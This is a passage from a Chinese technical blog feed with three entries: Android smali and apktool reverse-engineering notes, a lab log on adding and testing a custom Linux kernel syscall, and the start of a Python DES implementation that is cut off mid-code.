style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center"><code>.field private isFlag:z</code></td><td style="text-align:center">定义变量</td></tr><tr><td style="text-align:center"><code>.method</code></td><td style="text-align:center">方法</td></tr><tr><td style="text-align:center"><code>.parameter</code></td><td style="text-align:center">方法参数</td></tr><tr><td style="text-align:center"><code>.prologue</code></td><td style="text-align:center">方法开始</td></tr><tr><td style="text-align:center"><code>.line 123</code></td><td style="text-align:center">此方法位于第 123 行</td></tr><tr><td style="text-align:center"><code>const/high16 v0, 0x7f03</code></td><td style="text-align:center">把 0x7f03 赋值给 v0</td></tr><tr><td style="text-align:center"><code>return-void</code></td><td style="text-align:center">函数返回 void</td></tr><tr><td style="text-align:center"><code>.end method</code></td><td style="text-align:center">函数结束</td></tr><tr><td style="text-align:center"><code>new-instance</code></td><td style="text-align:center">创建实例</td></tr><tr><td style="text-align:center"><code>iput-object</code></td><td style="text-align:center">对象赋值</td></tr><tr><td style="text-align:center"><code>iget-object</code></td><td style="text-align:center">调用对象</td></tr><tr><td style="text-align:center"><code>move-result-object</code></td><td style="text-align:center">将上一句的结果赋值给寄存器</td></tr><tr><td style="text-align:center"><code>new-array v0, v1, type</code></td><td style="text-align:center">构造指定类型与大小的数组，并赋值给寄存器</td></tr><tr><td style="text-align:center"><code>array-length v0, v1</code></td><td style="text-align:center">获取指定寄存器中数组的长度并赋值给寄存器</td></tr><tr><td style="text-align:center"><code>const/4</code></td><td style="text-align:center">赋值</td></tr><tr><td style="text-align:center"><code>rem-int/2addr v0, v1</code></td><td style="text-align:center">计算模结果存入寄存器</td></tr><tr><td style="text-align:center"><code>int-to-byte</code></td><td style="text-align:center">整型转字节型</td></tr><tr><td style="text-align:center"><code>goto</code></td><td style="text-align:center">直接跳转到指定位置</td></tr><tr><td style="text-align:center"><code>return-object</code></td><td style="text-align:center">返回一个对象类型</td></tr></tbody></table><h2 id="Smali-中函数的调用"><a href="#Smali-中函数的调用" class="headerlink" title="Smali 中函数的调用"></a>Smali 中函数的调用</h2><p>函数分为 direct 和 virtual 两种类型。direct method 就是 private 函数，其余的 public 和 protected 函数都属于 virtual method。</p><h3 id="invoke-static"><a href="#invoke-static" class="headerlink" title="invoke-static"></a><code>invoke-static</code></h3><p>调用静态函数。</p><pre><code class="smali">invoke-static {v0}, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</code></pre><h3 id="invoke-super"><a href="#invoke-super" class="headerlink" title="invoke-super"></a><code>invoke-super</code></h3><p>调用父类方法用的指令（一般用于调用 onCreate、onDestroy）。</p><h3 id="invoke-direct"><a href="#invoke-direct" class="headerlink" title="invoke-direct"></a><code>invoke-direct</code></h3><p>调用 private 函数。</p><pre><code class="smali">invoke-direct {p0}, Landroid/app/TabActivity;-&gt;&lt;init&gt;()V</code></pre><h3 id="invoke-virtual"><a href="#invoke-virtual" class="headerlink" title="invoke-virtual"></a><code>invoke-virtual</code></h3><p>用于调用 protected 或 public 函数。</p><pre><code class="smali">invoke-virtual {v0,v1}, Lcom/ccc;-&gt;Message(Ljava/lang/Object;)V</code></pre><h3 id="invoke-xxxxx-range"><a href="#invoke-xxxxx-range" class="headerlink" title="invoke-xxxxx/range"></a><code>invoke-xxxxx/range</code></h3><p>当方法参数多于 5 个时（含 5 个），不能直接使用以上指令，而是在后面加上 <code>/range</code> 表示范围。</p><pre><code class="smali">invoke-direct/range {v0 .. v5}, Lcmb/pb/ui/PBContainerActivity;-&gt;h(ILjava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;I)Z</code></pre><h2 id="Smali-中的条件跳转分支"><a href="#Smali-中的条件跳转分支" class="headerlink" title="Smali 中的条件跳转分支"></a>Smali 中的条件跳转分支</h2><table><thead><tr><th style="text-align:center">代码</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"><code>if-eq vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ne vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 不等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-lt vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 小于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ge vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 大于等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gt vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 大于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-le vA, vB, :cond_**</code></td><td style="text-align:center">如果 vA 小于等于 vB 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-eqz vA, :cond_**</code></td><td style="text-align:center">如果 vA 等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-nez vA, :cond_**</code></td><td style="text-align:center">如果 vA 不等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-ltz vA, :cond_**</code></td><td style="text-align:center">如果 vA 小于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gez vA, :cond_**</code></td><td style="text-align:center">如果 vA 大于等于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-gtz vA, :cond_**</code></td><td style="text-align:center">如果 vA 大于 0 则跳转到 <code>:cond_**</code></td></tr><tr><td style="text-align:center"><code>if-lez vA, :cond_**</code></td><td style="text-align:center">如果 vA 小于等于 0 则跳转到 <code>:cond_**</code></td></tr></tbody></table><h2 id="Smali-代码编写"><a href="#Smali-代码编写" class="headerlink" title="Smali 代码编写"></a>Smali 代码编写</h2><h3 id="静态返回-HelloWorld-的方法"><a href="#静态返回-HelloWorld-的方法" class="headerlink" title="静态返回 HelloWorld 的方法"></a>静态返回 HelloWorld 的方法</h3><pre><code class="smali">.class public Lf8/helloworld/helloStr; # 类声明    .super Ljava/lang/Object; # 父类声明    .method public static retHello()Ljava/lang/String; # 函数声明    .locals 1 # 寄存器数量    const-string v0, &quot;Hello World from StaticMethod&quot; # 新建字符串    return-object v0 # 返回Object类型.end method # 方法结束声明</code></pre><h3 id="返回静态-field-的方法"><a href="#返回静态-field-的方法" class="headerlink" title="返回静态 field 的方法"></a>返回静态 field 的方法</h3><pre><code class="smali">.field public static final hStr:Ljava/lang/String; = &quot;Hello World from static field&quot; # field声明与初始化.method public static retHello2()Ljava/lang/String;    .locals 1    sget-object v0, Lf8/helloworld/helloStr;-&gt;hStr:Ljava/lang/String; # 获取field    return-object v0.end method</code></pre><h3 id="普通的函数"><a href="#普通的函数" class="headerlink" title="普通的函数"></a>普通的函数</h3><pre><code class="smali">.method public constructor &lt;init&gt;()V    .locals 0    invoke-direct {p0}, Ljava/lang/Object;-&gt;&lt;init&gt;()V    return-void.end method.method public retHello3()Ljava/lang/String;    .locals 1    const-string v0, &quot;Hello World from Method&quot;    return-object v0.end method</code></pre><h3 id="普通的-field-与函数"><a href="#普通的-field-与函数" class="headerlink" title="普通的 field 与函数"></a>普通的 field 与函数</h3><pre><code class="smali">.field public hStr2:Ljava/lang/String;.method public constructor &lt;init&gt;()V    .locals 1    invoke-direct {p0}, Ljava/lang/Object;-&gt;&lt;init&gt;()V    const-string v0, &quot;Hello field&quot; # 初始化非静态field    iput-object v0, p0, Lf8/helloworld/helloStr;-&gt;hStr2:Ljava/lang/String;    return-void.end method.method public retHello4()Ljava/lang/String;    .locals 1    iget-object v0, p0, Lf8/helloworld/helloStr;-&gt;hStr2:Ljava/lang/String;    return-object v0.end method</code></pre><p>调用时需要先初始化一个实例：</p><pre><code class="smali">new-instance v1, Lf8/helloworld/helloStr;invoke-direct {v1}, Lf8/helloworld/helloStr;-&gt;&lt;init&gt;()Vinvoke-virtual {v1}, Lf8/helloworld/helloStr;-&gt;retHello3()Ljava/lang/String;move-result-object v1</code></pre><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="Android-Log"><a href="#Android-Log" class="headerlink" title="Android Log"></a>Android Log</h3><p>来自于包 <code>android/killer/log</code>。</p><pre><code class="smali">invoke-static {v0}, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V</code></pre><h3 id="LoadLibrary"><a href="#LoadLibrary" class="headerlink" title="LoadLibrary"></a>LoadLibrary</h3><pre><code class="smali">invoke-static {v0}, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</code></pre><h3 id="stackTrace"><a href="#stackTrace" class="headerlink" title="stackTrace"></a>stackTrace</h3><p>打印当前函数堆栈，方法为 <code>Thread.dumpStack()</code>。</p><pre><code class="smali">invoke-static {}, Ljava/lang/Thread;-&gt;dumpStack()V</code></pre><h3 id="Method-Trace"><a href="#Method-Trace" class="headerlink" title="Method Trace"></a>Method Trace</h3><p>函数跟踪。</p><pre><code class="smali">invoke-static {}, Landroid/os/Debug;-&gt;startMethodTracing()Vinvoke-static {}, Landroid/os/Debug;-&gt;stopMethodTracing()V</code></pre><p>需要添加权限。</p><pre><code class="xml">&lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot;/&gt;&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;</code></pre><p>保存的 trace 文件可以 dump 出来使用 monitor 来打开。</p><h3 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h3><pre><code class="smali">const-string v1, &quot;%d&quot; # 格式化描述符const/4 v2, 0x1 # 数组长度new-array v2, v2 [Ljava/lang/Object; # 创建Object数组aput-object v3, v2, v4 # 填充数组...invoke-static {v1, v2}, Ljava/lang/String;-&gt;format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String; # 格式化字符串# 字符串替换invoke-virtual {v0, v1, v2}, Ljava/lang/String;-&gt;replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;invoke-virtual {v0, v1, v2}, Ljava/lang/String;-&gt;replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</code></pre><h3 id="waitForDebugger"><a href="#waitForDebugger" class="headerlink" title="waitForDebugger"></a>waitForDebugger</h3><pre><code class="smali">invoke-static {}, Landroid/os/Debug;-&gt;waitForDebugger()V</code></pre><h1 id="apktool-ShakaApktool"><a href="#apktool-ShakaApktool" class="headerlink" title="apktool/ShakaApktool"></a>apktool/ShakaApktool</h1><pre><code class="bash">java -jar apktool.jar d example.apk -o example-dirjava -jar apktool.jar b example-dir -o example.apk</code></pre><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>d</code></td><td style="text-align:center">反编译</td></tr><tr><td style="text-align:center"><code>b</code></td><td style="text-align:center">回编译</td></tr></tbody></table><pre><code class="bash">java -jar ShakaApktool.jar d -df example.apk -o example-dirjava -jar ShakaApktool.jar b example-dir -o example.apk</code></pre><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>-df</code>、<code>--default-framework</code></td><td style="text-align:center">使用默认的框架资源文件</td></tr></tbody></table><h1 id="安卓-apk-调试（不需要修改原-apk-文件）"><a href="#安卓-apk-调试（不需要修改原-apk-文件）" class="headerlink" title="安卓 apk 调试（不需要修改原 apk 文件）"></a>安卓 apk 调试（不需要修改原 apk 文件）</h1><ol><li>使用 apktool/ShakaApktool 反编译 apk 文件</li><li>在 Android Studio 中导入源码</li><li>设置远程调试选项，Host 填写为 localhost，端口填写为 8700</li><li>在 Debugger setup 中勾选 Suspend on process entry point、Suspend on thread start/exit 以及 Suspend on library load/unload</li><li>使用 adb 以 debug 方式启动 apk：<code>adb shell am start -D -n packageName/ActivityName</code></li><li>下好断点，打开 monitor，开始调试</li></ol><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://www.52pojie.cn/thread-395689-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-395689-1-1.html</a><br><a href="https://www.52pojie.cn/thread-396966-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-396966-1-1.html</a><br><a href="https://www.52pojie.cn/thread-397858-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-397858-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;开始学习安卓。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>如何给Linux添加系统调用</title>
    <link href="blog.b3ale.cn/2019/11/27/%E5%A6%82%E4%BD%95%E7%BB%99Linux%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <id>blog.b3ale.cn/2019/11/27/%E5%A6%82%E4%BD%95%E7%BB%99Linux%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</id>
    <published>2019-11-27T05:50:19.000Z</published>
    <updated>2020-03-20T02:29:59.615Z</updated>
    
    <content type="html"><![CDATA[<p>操作系统实验记录。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>OS：Ubuntu 16.04.6</p><pre><code class="zsh">➜  ~ uname -aLinux ubuntu 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 14:01:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre><h1 id="First-Download-Linux-Kernel-Source"><a href="#First-Download-Linux-Kernel-Source" class="headerlink" title="First: Download Linux Kernel Source"></a>First: Download Linux Kernel Source</h1><pre><code>wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.20.17.tar.gztar -xvf linux-4.20.17.tar.gzsudo mv linux-4.20.17/ /usr/src/cd /usr/src/linux-4.20.17/</code></pre><h1 id="Second-Install-Dependences"><a href="#Second-Install-Dependences" class="headerlink" title="Second: Install Dependences"></a>Second: Install Dependences</h1><pre><code class="bash">sudo apt updatesudo apt install bison flex libssl-dev libncurses5-dev</code></pre><h1 id="Third-Add-My-Syscall"><a href="#Third-Add-My-Syscall" class="headerlink" title="Third: Add My Syscall"></a>Third: Add My Syscall</h1><p>入口（<code>arch/x86/entry/syscalls/syscall_64.tbl</code>）</p><pre><code># Here are my syscalls548     64      mysyscall               sys_mysyscall</code></pre><p>系统调用声明（<code>include/linux/syscalls.h</code>）</p><pre><code class="c">// Here are my syscallsasmlinkage long sys_mysyscall(void);</code></pre><p>添加调用（<code>kernel/sys.c</code>）</p><pre><code class="c">// Here are my syscallsasmlinkage long sys_mysyscall(void) {    printk(&quot;Hello Kernel!!!\n&quot;);    return 1712190426;}</code></pre><h1 id="Forth-Compile"><a href="#Forth-Compile" class="headerlink" title="Forth: Compile"></a>Forth: Compile</h1><pre><code class="bash">make mrpropermake cleanmake menuconfig # 将Device drivers中的Staging drivers取消# 下面的编译时间比较久 可以通过time记录一下时间time make bzImage # 编译并生成压缩的内核映像 大约半个小时time make modules # 编译模块 大约两个多小时sudo time make modules_install # 安装模块 大约三分多种sudo time make install # 安装内核 大约一分多钟</code></pre><p>编译成功后 reboot 重启系统。</p><h1 id="Fifth-Test"><a href="#Fifth-Test" class="headerlink" title="Fifth: Test"></a>Fifth: Test</h1><pre><code class="zsh">➜  ~ uname -aLinux ubuntu 4.20.17 #1 SMP Thu Nov 28 22:48:22 PST 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p>查看添加的系统调用是否成功：</p><pre><code class="zsh">➜  ~ grep -A 1 mysyscall /proc/kallsyms0000000000000000 T sys_mysyscall0000000000000000 T usermodehelper_read_unlock</code></pre><p>编写测试程序如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;sys/syscall.h&gt;int main() {    long ret = syscall(548);    printf(&quot;%ld\n&quot;, ret);    return 0;}</code></pre><p>运行结果，返回值为设定好的值：</p><pre><code class="zsh">➜  ~ ./31712190426</code></pre><p>使用 dmesg 命令（dmesg 命令显示 linux 内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM 等多个运行级别的大量的系统信息）查看调用情况：</p><pre><code class="zsh">➜  ~ dmesg | grep &quot;Hello&quot;[  228.310507] Hello Kernel!!!</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.cnblogs.com/tod-reg20130101/articles/9280792.html" target="_blank" rel="noopener">https://www.cnblogs.com/tod-reg20130101/articles/9280792.html</a><br><a href="https://www.zybuluo.com/hakureisino/note/514321" target="_blank" rel="noopener">https://www.zybuluo.com/hakureisino/note/514321</a><br><a href="https://www.jianshu.com/p/b2d5fa8af581" target="_blank" rel="noopener">https://www.jianshu.com/p/b2d5fa8af581</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;操作系统实验记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Python实现DES、AES加密解密算法</title>
    <link href="blog.b3ale.cn/2019/11/14/Python%E5%AE%9E%E7%8E%B0DES%E3%80%81AES%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>blog.b3ale.cn/2019/11/14/Python%E5%AE%9E%E7%8E%B0DES%E3%80%81AES%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2019-11-14T02:09:38.000Z</published>
    <updated>2020-03-20T01:27:09.955Z</updated>
    
    <content type="html"><![CDATA[<p>通过实现 DES 和 AES 深入了解对称加密（实现均采用 CBC 模式）。</p><a id="more"></a><h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><p>数据加密标准（英语：Data Encryption Standard，缩写为 DES）是一种对称密钥加密块密码算法，1976 年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），随后在国际上广泛流传开来。它基于使用 56 位密钥的对称算法。这个算法因为包含一些机密设计元素，相对短的密钥长度以及怀疑内含美国国家安全局（NSA）的后门而在开始时有争议，DES 因此受到了强烈的学院派式的审查，并以此推动了现代的块密码及其密码分析的发展。</p><h2 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h2><p>DES 是一种典型的块密码—一种将固定长度的明文通过一系列复杂的操作变成同样长度的密文的算法。对 DES 而言，块长度为 64 位。同时，DES 使用密钥来自定义变换过程，因此算法认为只有持有加密所用的密钥的用户才能解密密文。密钥表面上是 64 位的，然而只有其中的 56 位被实际用于算法，其余 8 位可以被用于奇偶校验，并在算法中被丢弃。因此，DES 的有效密钥长度仅为 56 位。</p><h3 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h3><p>算法的整体结构中，有 16 个相同的处理过程（round），并在首尾各有一次置换，称为 $IP$ 与 $FP$（或称 $IP^-1$，$FP$ 为 $IP$ 的反函数。$IP$ 和 $FP$ 几乎没有密码学上的重要性，为了在 1970 年代中期的硬件上简化输入输出数据库的过程而被显式的包括在标准中。</p><p>在主处理回次前，数据块被分成两个 32 位的半块，并被分别处理；这种交叉的方式被称为费斯妥结构。费斯妥结构保证了加密和解密过程足够相似—唯一的区别在于子密钥在解密时是以反向的顺序应用的，而剩余部分均相同。这样的设计大大简化了算法的实现，尤其是硬件实现，因为没有区分加密和解密算法的需要。</p><p>$\oplus$ 符号代表异或（XOR）操作。“F 函数”将数据半块与某个子密钥进行处理。然后，一个 F 函数的输出与另一个半块异或之后，再与原本的半块组合并交换顺序，进入下一个回次的处理。在最后一个回次完成时，两个半块需要交换顺序，这是费斯妥结构的一个特点，以保证加解密的过程相似。</p><p><img src="/pics/Python实现DES、AES加密解密算法/1.png" srcset="/img/loading.gif" alt></p><h3 id="费斯妥函数（F-函数）"><a href="#费斯妥函数（F-函数）" class="headerlink" title="费斯妥函数（F 函数）"></a>费斯妥函数（F 函数）</h3><p>费斯妥函数（F 函数）的过程中，其每次对半块（32 位）进行操作，并包括四个步骤：</p><ul><li>扩张：用扩张置换（图中的 E）将 32 位的半块扩展到 48 位，其输出包括 8 个 6 位的块，每块包含 4 位对应的输入位，加上两个邻接的块中紧邻的位。</li><li>与密钥混合：用异或操作将扩张的结果和一个子密钥进行混合。16 个 48 位的子密钥—每个用于一个回次的 F 变换—是利用密钥调度从主密钥生成的（见下文）。</li><li>S 盒：在与子密钥混合之后，块被分成 8 个 6 位的块，然后使用“S 盒”，或称“置换盒”进行处理。8 个 S 盒的每一个都使用以查找表方式提供的非线性的变换将它的 6 个输入位变成 4 个输出位。S 盒提供了 DES 的核心安全性—如果没有 S 盒，密码会是线性的，很容易破解。</li><li>置换：最后，S 盒的 32 个输出位利用固定的置换，“P 置换”进行重组。这个设计是为了将每个 S 盒的 4 位输出在下一回次的扩张后，使用 4 个不同的 S 盒进行处理。</li></ul><p>S 盒，P 置换和 E 扩张各自满足了克劳德·香农在 1940 年代提出的实用密码所需的必要条件，“混淆与扩散”。</p><p><img src="/pics/Python实现DES、AES加密解密算法/2.png" srcset="/img/loading.gif" alt></p><h3 id="密钥调度"><a href="#密钥调度" class="headerlink" title="密钥调度"></a>密钥调度</h3><p>加密过程中密钥调度—产生子密钥的算法里，首先使用选择置换 1（PC-1）从 64 位输入密钥中选出 56 位的密钥—剩下的 8 位要么直接丢弃，要么作为奇偶校验位。然后，56 位分成两个 28 位的半密钥；每个半密钥接下来都被分别处理。在接下来的回次中，两个半密钥都被左移 1 或 2 位（由回次数决定），然后通过选择置换 2（PC-2）产生 48 位的子密钥—每个半密钥 24 位。移位（图中由&lt;&lt;标示）表明每个子密钥中使用了不同的位，每个位大致在 16 个子密钥中的 14 个出现。</p><p>解密过程中，除了子密钥输出的顺序相反外，密钥调度的过程与加密完全相同。</p><p><img src="/pics/Python实现DES、AES加密解密算法/3.png" srcset="/img/loading.gif" alt></p><h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><pre><code class="python">#!/usr/bin/env python# -*- encoding=utf-8 -*-ENCRYPT = 0DECRYPT = 1BLOCK_SIZE = 8# 明文分组初始置换表IP = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16,      8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7]# 末置换表IP_ = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61,       29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]# S盒压缩置换表（6bit-&gt;4bit）S1 = [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7, 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3,      8, 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0, 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]S2 = [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10, 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11,      5, 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15, 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]S3 = [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15,      1, 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7, 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]S4 = [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15, 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14,      9, 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4, 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]S5 = [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9, 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8,      6, 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14, 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]S6 = [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11, 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3,      8, 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6, 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]S7 = [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1, 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8,      6, 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2, 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]S8 = [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7, 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9,      2, 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8, 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]S = [S1, S2, S3, S4, S5, S6, S7, S8]# P盒置换表（32bit）P = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31,     10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25]# 密钥置换表（64bit-&gt;56bit）PC_1 = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44,        36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4]# 密钥压缩置换表（56bit-&gt;48bit）PC_2 = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2,        41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]# 明文扩展置换表（32bit-&gt;48bit）E = [32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16,     17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1]# 子密钥循环左移位数表（16次）SHIFT = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]sub_keys = [[0] * 48] * 16def convert_string_to_bitlist(string):    data = [ord(c) for c in string]    l = len(data) * 8    result = [0] * l    pos = 0    for ch in data:        i = 7        while i &gt;= 0:            if ch &amp; (1 &lt;&lt; i) != 0:                result[pos] = 1            else:                result[pos] = 0            pos += 1            i -= 1    return resultdef convert_bitlist_to_string(bitlist):    result = []    pos = 0    c = 0    while pos &lt; len(bitlist):        c += bitlist[pos] &lt;&lt; (7 - pos % 8)        if pos % 8 == 7:            result.append(c)            c = 0        pos += 1    return &#39;&#39;.join([chr(c) for c in result])def permute(table, block):    return list(map(lambda x: block[x - 1], table))def create_sub_keys(key):    key = permute(PC_1, convert_string_to_bitlist(key))    i = 0    lkey = key[:28]    rkey = key[28:]    while i &lt; 16:        j = 0        while j &lt; SHIFT[i]:            lkey.append(lkey[0])            del lkey[0]            rkey.append(rkey[0])            del rkey[0]            j += 1        sub_keys[i] = permute(PC_2, lkey + rkey)        # print sub_keys[i]        i += 1def des_cipher(block, choice):    block = permute(IP, block)    lblock = block[:32]    rblock = block[32:]    if choice == ENCRYPT:        iteration = 0        iteration_adjustment = 1    elif choice == DECRYPT:        iteration = 15        iteration_adjustment = -1    i = 0    # 16轮F函数    while i &lt; 16:        rtemp = rblock[:]        # 将右半块32位扩展为48位        rblock = permute(E, rblock)        # 将扩展后的右半块和轮密钥进行逐位异或        rblock = list(map(lambda x, y: x ^ y, rblock, sub_keys[iteration]))        b = [rblock[:6], rblock[6:12], rblock[12:18], rblock[18:24],             rblock[24:30], rblock[30:36], rblock[36:42], rblock[42:]]        j = 0        bn = [0] * 32        pos = 0        # S盒置换        while j &lt; 8:            row = (b[j][0] &lt;&lt; 1) + b[j][5]            col = (b[j][1] &lt;&lt; 3) + (b[j][2] &lt;&lt; 2) + (b[j][3] &lt;&lt; 1) + b[j][4]            v = S[j][(16 * row) + col]            